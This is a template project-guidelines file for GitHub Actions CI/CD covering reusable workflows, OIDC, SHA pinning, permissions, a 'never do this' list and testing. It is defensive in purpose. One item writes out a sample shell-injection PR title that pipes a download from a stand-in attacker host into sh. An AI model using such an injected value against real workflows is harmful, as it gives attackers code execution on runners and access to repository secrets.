# [PROJECT NAME] - [ONE LINE DESCRIPTION]

## Tech Stack

- GitHub Actions for CI/CD
- Reusable workflows for shared pipeline logic
- Composite actions for step-level reuse
- Matrix strategies for multi-platform/version testing
- OIDC for cloud provider authentication (AWS, GCP, Azure)

## Project Structure

```
{project-root}/
├── .github/
│   ├── workflows/
│   │   ├── ci.yml                    # PR validation (lint, test, build)
│   │   ├── cd.yml                    # Deploy on merge to main
│   │   ├── release.yml               # Tag-triggered release workflow
│   │   ├── scheduled.yml             # Cron-triggered maintenance jobs
│   │   └── reusable/
│   │       ├── build-and-test.yml    # Reusable: build + test matrix
│   │       ├── deploy.yml            # Reusable: deploy to environment
│   │       └── docker-publish.yml    # Reusable: build and push image
│   ├── actions/
│   │   ├── setup-project/
│   │   │   └── action.yml            # Composite: install deps + cache
│   │   └── notify/
│   │       └── action.yml            # Composite: Slack/Teams notification
│   └── CODEOWNERS
```

## Architecture Rules

- **Reusable workflows for pipeline stages.** Build, test, deploy, and release are reusable workflows called with `uses: ./.github/workflows/reusable/build-and-test.yml`. Calling workflows pass inputs and secrets. Never copy-paste 50 lines of build steps across 4 workflow files.
- **Composite actions for repeated steps.** "Install Node, restore cache, install deps" is a composite action, not 8 lines duplicated in every job. Composite actions live in `.github/actions/` and are called with `uses: ./.github/actions/setup-project`.
- **Environments gate deployments.** Production deployments use GitHub Environments with required reviewers, wait timers, and branch protection. Never deploy to production from an unprotected trigger. Environments also scope secrets — prod secrets are not accessible from dev workflows.
- **OIDC over long-lived credentials.** Use `aws-actions/configure-aws-credentials` with OIDC role assumption. Never store `AWS_ACCESS_KEY_ID` as a repository secret. OIDC tokens are short-lived, scoped to the workflow run, and cannot be extracted for reuse.
- **Fail fast, cache aggressively.** Linting and type checking run before tests. If lint fails, don't waste 10 minutes running the test suite. Cache `node_modules`, `.gradle`, `pip` directories, and Docker layers. A CI run should take under 5 minutes for most projects.

## Coding Conventions

- **Pin action versions by SHA, not tag.** `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11` (v4.1.1), not `uses: actions/checkout@v4`. Tags are mutable — a compromised action can push malicious code to an existing tag. SHA pins are immutable. Add a comment with the version for readability.
- **Explicit permissions on every workflow.** Set `permissions:` at the workflow level. `contents: read` for checkout, `id-token: write` for OIDC, `packages: write` for GHCR. Never use the default `write-all` token permissions.
- **Outputs over artifacts for small data.** Pass build version, image tag, or deployment URL between jobs using `outputs`. Reserve artifacts for files (test reports, binaries, coverage). Never upload a 10-byte text file as an artifact to pass a string between jobs.
- **Concurrency control on deployments.** Use `concurrency: { group: deploy-${{ github.ref }}, cancel-in-progress: false }` on deployment workflows. Never let two deployments to the same environment run simultaneously. For CI, `cancel-in-progress: true` is fine.
- **Step IDs for conditional logic.** Give every step that produces output an `id:`. Reference it with `steps.step_id.outputs.value` or `steps.step_id.outcome`. Never use step index numbers.

## Library Preferences

- **Checkout:** `actions/checkout` (always with `fetch-depth: 0` if you need git history for changelogs or versioning).
- **Node setup:** `actions/setup-node` with `cache: 'npm'` (or pnpm/yarn). Not manual `npm ci` caching with `actions/cache` — the setup action handles it.
- **Docker:** `docker/build-push-action` with `docker/setup-buildx-action` for layer caching. Not manual `docker build && docker push` commands.
- **AWS auth:** `aws-actions/configure-aws-credentials` with OIDC. Not hardcoded access keys.
- **Release:** `softprops/action-gh-release` for GitHub Releases. Not manual `gh release create` in a script step.

## File Naming

- Workflows: `kebab-case.yml` describing the trigger or purpose (e.g., `ci.yml`, `deploy-prod.yml`)
- Reusable workflows: same naming, in `reusable/` subdirectory
- Composite actions: directory name is the action name (e.g., `setup-project/action.yml`)
- Always `.yml`, not `.yaml` — GitHub's documentation and UI use `.yml` consistently

## NEVER DO THIS

1. **Never use `pull_request_target` with `actions/checkout` of the PR branch.** `pull_request_target` runs with write permissions and access to secrets. Checking out and running code from a fork PR gives attackers arbitrary code execution with your secrets. Use `pull_request` for untrusted code.
2. **Never interpolate untrusted input into `run:` scripts.** `run: echo "${{ github.event.pull_request.title }}"` is a shell injection vector. An attacker sets the PR title to `"; curl evil.com/steal | sh; #"` and owns your runner. Use environment variables: `env: TITLE: ${{ github.event.pull_request.title }}` then `echo "$TITLE"`.
3. **Never use `continue-on-error: true` to hide failures.** It turns red steps green. If a step can legitimately fail (optional lint, flaky integration test), handle it with `if: steps.step_id.outcome == 'failure'` in a subsequent step. Don't silence failures globally.
4. **Never hardcode runner OS in reusable workflows.** Accept `runs-on` as an input. Consumers may need `ubuntu-latest`, `macos-latest`, or self-hosted runners. A reusable workflow locked to `ubuntu-latest` forces everyone onto your infrastructure choice.
5. **Never store secrets in workflow files or composite actions.** Not even "internal" tokens. Use GitHub Secrets (repository or environment-scoped). Workflow files are readable by anyone with repo access. Secrets are encrypted and masked in logs.
6. **Never use `workflow_dispatch` without input validation.** If a workflow accepts a `ref` or `environment` input, validate it: `if: contains(fromJSON('["dev","staging","prod"]'), inputs.environment)`. Unvalidated inputs let anyone deploy any branch to any environment.
7. **Never skip `timeout-minutes` on jobs.** The default timeout is 360 minutes (6 hours). A hung job burns Actions minutes for hours. Set `timeout-minutes: 15` (or appropriate) on every job. Set step-level timeouts on known-slow steps.

## Testing

- Test workflows locally with `act` (nektos/act) before pushing. It runs workflows in Docker containers matching GitHub's runner images. Catches YAML syntax errors and step logic bugs without wasting CI minutes.
- Test reusable workflows by creating a `test-reusable.yml` that calls them with known inputs and asserts outputs. Run it on a schedule or manually via `workflow_dispatch`.
- Test composite actions with a minimal workflow that exercises inputs, outputs, and error paths. Pin the action to the PR branch during testing: `uses: ./.github/actions/setup-project`.
- Validate YAML syntax with `actionlint` in a pre-commit hook or CI step. It catches expression errors, invalid contexts, and deprecated features that GitHub's parser silently ignores.
- Monitor workflow reliability with GitHub's workflow run API. Alert on workflows with >10% failure rate — flaky CI erodes trust and leads to developers ignoring failures.
